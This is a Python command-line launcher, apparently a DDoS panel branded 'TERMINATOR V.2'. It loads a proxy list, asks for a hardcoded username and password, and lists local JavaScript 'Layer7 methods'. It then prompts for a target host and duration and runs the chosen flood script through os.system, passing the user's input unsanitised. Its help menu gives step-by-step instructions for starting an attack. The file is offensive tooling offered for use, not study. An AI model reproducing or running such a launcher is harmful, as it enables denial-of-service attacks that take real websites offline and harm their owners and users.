import os
import getpass
import time
import sys
from pystyle import Colors, Colorate

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.green_to_red, f"TERMINATOR V.2 😈 | USER: ROOT | PLAN :: VVIP | Proxy: {bots_str} | READY TO ATTACK 😈"))
    print("")

def ascii_banner():
    print(Colorate.Diagonal(Colors.green_to_red, '''
⠀⠀⠀⠀⢀⡴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡀⠀⠀⠀
⠀⠀⠀⠀⡌⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠤⠤⠄⠠⠀⠀⠀⠀⠠⠤⠄⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠱⠀⠀⠀
⠀⠀⠀⣘⠀⠆⠀⠀⠀⠀⠀⠀⠀⢀⠠⠐⠂⠉⠀⠀⠀⠀⠀⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠐⠠⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢣⠀⠀
⠀⠀⠀⠿⠀⠂⠀⠀⠀⠀⢀⠄⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠂⠄⡀⠀⠀⠀⠀⠀⠁⡆⡄⠀
⠀⠀⠸⡆⠀⡇⠀⠀⡠⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⢸⠀⢡⢃⠀
⠀⠀⡀⡇⠀⢃⢀⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠙⠀⢸⠸⠀
⠀⠀⡃⡇⠀⠸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠇⠀⣸⢸⠀
⠀⠀⡇⣇⠀⠀⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡌⠀⠀⠘⠢⡀⢀⡠⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠁⠀⣿⠐⠀
⠀⠀⡇⢻⡀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣜⠁⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠲⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⠀⢰⡿⢰⠀
⠀⠀⡃⢸⣧⠀⠀⡌⠳⡀⠀⠀⠀⠀⣀⡀⢀⡆⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠄⡠⢄⢀⡼⢁⠀⢀⣾⡇⡌⠀
⠀⢀⢳⠀⣿⣆⠀⠸⣆⠙⢷⠲⣤⣋⠀⠈⠍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠄⢒⣩⠴⡶⠋⢠⡇⠀⣼⣿⠀⣇⠀
⠀⠎⣿⡆⠸⣿⣷⣴⣿⣷⣌⡀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡨⠆⠀⠀⠀⠀⢁⣴⣿⣷⣾⣿⡇⢠⣿⡄
⢀⠰⠿⣷⠀⢻⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠉⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡤⠊⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⡟⠀⣾⡿⡀
⠸⠀⠀⠈⢣⠈⢿⣿⣿⠟⠁⠀⢀⠀⠀⠀⠀⠀⠀⠑⠒⢏⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⠙⠀⠀⠀⠀⠀⠀⡀⠈⢿⣿⣿⡿⠁⡜⠁⠀⠁
⠀⠀⠀⢀⠀⠁⠘⠛⠁⠀⣀⣠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⣀⣀⢰⠀⠒⠂⠃⠀⠀⠀⠀⠀⠀⠀⢰⣿⠀⠀⠛⠿⠧⠀⠀⠀⠀⠀
⠀⠀⠀⡌⠀⠀⠀⠀⠀⠀⠙⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠷⠒⠀⠀⠀⠀⠀⡆⠀⡀
⠀⢡⠀⠸⡆⠀⠀⠀⠀⠀⠀⠀⠈⠛⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠁⠀⠀⠀⠀⠀⠀⠀⣰⠁⠀⠀
⠀⠈⡄⠀⢹⡄⠀⢠⢶⣿⣶⣤⡀⠀⠀⠀⠀⠠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠗⠂⠀⠀⠀⢀⣠⣴⣶⣦⠀⠀⢰⡏⠀⠄⠀
⠀⠀⠙⠈⢻⣧⠀⠈⠘⣿⣿⠓⠛⣒⡀⠀⠀⠀⠈⠑⠄⡀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠊⠀⠀⠀⠀⢀⡐⠛⠻⣿⣿⠉⠃⠀⣿⡖⢨⠀⠀
⠀⠀⠀⠇⠀⡟⠀⠀⠀⢿⣿⡀⠀⠿⣿⠗⢤⡀⠀⠀⠀⠈⢆⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⢀⡄⢴⣿⡿⠀⢀⣿⡟⠀⠀⠀⣿⠁⡎⠀⠀
⠀⠀⠀⠰⣰⠃⠀⠀⢰⠘⣿⣷⣀⠀⠉⠀⢘⣷⣶⡄⠀⠀⠘⣦⣀⣀⣀⣴⠋⠀⠀⢠⣴⣜⠇⠈⠉⠁⢀⣼⣿⠃⡄⠀⠀⢻⡀⠁⠀⠀
⠀⠀⢀⠜⠁⠀⠀⠀⠿⢆⡈⠛⠿⢿⣶⣿⣿⣿⣿⣿⡄⠀⠀⠈⢻⣿⡿⠁⠀⠀⢠⣿⣿⣿⣿⣶⣶⣾⡿⠟⠁⣰⠇⠀⠀⠀⠙⣄⠀⠀
⠀⠀⡊⠀⠀⠀⠀⠀⠀⠀⠙⠒⠒⠒⠀⠀⠀⠀⠠⢉⣉⣂⡀⠀⠀⣻⠀⠀⢀⠐⢋⠁⠀⠀⠀⠀⠀⠠⠄⠒⠊⠁⠀⠀⠀⠀⠀⠈⡆⠀
⠀⠀⠣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⢻⡞⠁⣶⠚⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠇⠀
⠀⠀⠀⠈⠐⠂⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⢀⡌⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠄⠒⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⡋⠘⢻⡍⠉⡗⢤⠴⠞⢶⣤⡀⠀⠀⠀⢠⣿⣿⣿⡄⠀⠀⠀⢸⠃⡶⠶⣤⡤⠖⠛⢲⠢⠒⢶⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⢃⠀⢺⠇⠀⡇⢀⠀⠀⠈⡝⠀⠀⠀⢠⣿⣟⠀⣿⣿⡀⠀⠀⠀⠂⠀⠀⢀⠀⣧⠀⢿⠆⠀⡘⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠆⠀⠃⢰⠇⠉⢀⠆⠰⢠⠁⠀⠀⠘⠿⣏⢀⢿⠿⠃⠀⠀⠀⡀⠀⢀⠀⡆⢿⠀⠈⠀⡘⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⣧⡀⠹⢠⡆⣼⠀⠀⣤⠀⠀⢻⠠⠁⠀⠀⡄⠀⠰⡇⢣⡨⠁⢂⣼⠀⠀⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⢸⣿⣧⡀⠀⠈⡇⠀⢰⣇⠀⠃⠀⣤⠀⢠⠀⣱⠂⠀⡏⠹⠀⢀⣿⣿⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠗⠀⠈⣿⣿⣧⡀⠀⠁⠀⠸⠁⠸⡖⠐⡿⠀⢾⠀⢹⠀⠀⠀⠀⣠⣿⣿⡿⠀⠰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠘⠻⣿⣿⣦⡄⠀⢰⠀⠀⠀⠀⠃⠀⠘⠀⢠⠀⠀⣤⣼⣿⣿⠙⠁⠀⠀⢨⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⡀⠀⠀⢀⡔⢿⣿⣇⠀⣾⣄⡀⠀⠀⠁⠀⠀⢀⣼⡇⠀⣿⡟⡽⣀⠄⠀⠀⢀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⢀⠀⢅⡔⠾⣿⣰⣿⣿⣿⣿⣶⣷⣾⣿⣿⣿⣿⢸⡿⡗⣄⠉⠀⡠⠔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠂⡀⠗⢴⠺⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢯⢳⡄⠃⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡘⠀⢦⠈⡉⠙⠿⠿⣿⠿⠟⠉⠉⠀⡆⠘⢠⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣄⠈⠘⡇⢠⣇⠀⡀⠀⣦⠀⠞⠘⢀⡔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠆⠈⡇⠀⠇⠀⠁⠀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠄⠀⠀⠀⠀⡄⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠐⠤⠀⠠⠢⠄⠀⠤⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
         AUTHOR: NASIF HIMADRI⠀⠀
        '''))
    print(Colorate.Horizontal(Colors.green_to_red, "☣️ WELCOME TO TERMINATOR V.2 😈 ☣️\n"))

def list_files_in_columns(directory):
    try:
        files = [f for f in os.listdir(directory) if f.endswith('.js')]
        if not files:
            print(Colorate.Horizontal(Colors.red_to_yellow, "No .js files found in the directory! ⚠️"))
            return []

        print(Colorate.Horizontal(Colors.green_to_red, "Available Files: 📂"))
        max_length = max(len(file) for file in files)
        column_width = max_length + 5
        num_columns = 3
        for i in range(0, len(files), num_columns):
            row_files = files[i:i + num_columns]
            formatted_row = ''.join(f"{file:<{column_width}}" for file in row_files)
            print(Colorate.Horizontal(Colors.green_to_blue, formatted_row))
        return files
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"Error listing files: {e}"))
        return []

def layer7():
    clear()
    si()
    print(Colorate.Horizontal(Colors.blue_to_red, ''' 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⠭⠙⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣷⣮⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣦⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣻⣿⣿⣿⣿⣿⠂⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣷⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⢙⣿⣿⣿⣿⣿⣴⣶
⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⢸⣧⠁⠀⠀⠀⠀⠀⠀⠀⢀⣽⣧⣿⣿⣿⣿⣿
⠀⡀⠀⠀⠀⠀⢸⣿⣿⣿⣸⣿⣷⣄⠀⠀⠀⠀⠀⣰⣿⣿⢸⣿⣿⣿⣿⣿
⠀⠈⠫⠂⠀⠀⠊⣿⢿⣿⡏⣿⠿⠟⠀⠀⠀⠀⠈⠿⠿⣿⢸⣿⣿⣿⠛⠋
⠀⠀⠀⠀⠱⡀⠈⠁⠀⢝⢷⡸⡇⠀⠀⠀⠀⠀⠀⠀⢹⢣⡿⡙⠀⠉⠀⠀
⠀⠀⠀⠀⢀⠇⠀⠀⢀⣾⣦⢳⡀⠀⠀⠀⠀⠀⠀⠀⢀⢟⣼⣧⡀⠀⠀⠀
⠀⠀⠀⢀⠎⠀⢀⣴⣿⣿⣿⡇⣧⠀⠀⠀⠀⠀⠀⠀⡾⣼⣿⣿⣿⡄⠀⠀
⠀⢀⡔⠁⠀⢠⡟⢻⡻⣿⣿⣿⣌⡀⠀⠀⠀⠀⠀⢘⣠⣿⣿⣿⢟⠇⠀⠀
⢀⡎⠀⠀⠀⣼⠁⣼⣿⣦⠻⣿⣿⣷⡀⠀⠀⠀⢠⣿⣿⣿⢏⣴⣿⣇⠀⠀
⢸⠀⠀⠀⠀⡟⢰⣿⣿⡟⠀⠘⢿⣿⣷⡀⠀⢠⣿⣿⡿⠁⠀⢿⣿⣿⠀⠀
⠈⠳⠦⠴⠞⠀⢸⣿⣿⠁⠀⠀⠀⠹⣿⡧⠀⣾⣿⠏⠀⠀⠀⠘⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⢰⣿⡇⠀⢿⣿⡀⠀⠀⠀⠀⣽⣿⡄⠀
⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀
⠀⠀⠀⠀⠀⠀⢸⣿⠁⠀⠀⠀⠀⢸⣿⡇⠀⢸⣿⠃⠀⠀⠀⠀⢸⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⡇⠀⢸⡿⠀⠀⠀⠀⠀⢸⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣆⠀⠀⠀⠀⠀⣿⣧⠀⣿⣧⠀⠀⠀⠀⠀⣼⣧⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠏⢿⠄⠀⠀⠀⠐⢸⣿⠀⣿⠇⠀⠀⠀⠀⢰⡿⠋⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀LIST LAYER7 METHODS
    '''))
    files = list_files_in_columns(".")
    if files:
        script_name = input(Colorate.Diagonal(Colors.green_to_red, "Enter Script Name: "))
        host = input(Colorate.Diagonal(Colors.green_to_red, "Enter Target Host: "))
        time_limit = input(Colorate.Diagonal(Colors.green_to_red, "Enter Time Limit: "))
        os.system(f"node {script_name} {host} {time_limit} 100 10 proxy.txt")

def menu():
    clear()
    ascii_banner()
    print(Colorate.Horizontal(Colors.green_to_red, '''
☣️ Type Layer7 To See Layer7 Methods ☣️⠀⠀⠀⠀  
☣️ Type "help" for Command List ☣️
    '''))

def main():
    menu()
    while True:
        cnc = input(Colorate.Diagonal(Colors.green_to_red, "NASIF@TERMINATOR#~ "))
        if cnc.lower() in ["layer7", "l7"]:
            layer7()
        elif cnc.lower() in ["clear", "cls"]:
            main()
        elif cnc.lower() == "help":
            print(Colorate.Horizontal(Colors.green_to_red, ''' 
Commands:
- LAYER7: View Layer7 attack methods and execute scripts
- HELP: Show this help menu
- CLEAR: Clear terminal screen

USER MANUAL:
1. Type "LAYER7" to see available Layer7 attack methods.
2. Select a script from the displayed list.
3. Enter the target host, time duration, and start the attack.
4. Ensure proxy.txt and other required files are in the same directory.
            '''))
        else:
            print(Colorate.Horizontal(Colors.red_to_yellow, f"Invalid command: {cnc} ❌"))

def login():
    clear()
    ascii_banner()
    user = "NASIF"
    passwd = "H4S4N"
    username = input("</> Username 😈: ")
    password = getpass.getpass(prompt='</> Password 😈: ')
    if username != user or password != passwd:
        print("")
        print("Invalid Username/Password! ❌")        
        sys.exit(1)
    elif username == user and password == passwd:
        print(Colorate.Horizontal(Colors.green_to_yellow, "Login Successful! 🎉"))
        time.sleep(0.5)
        main()

login()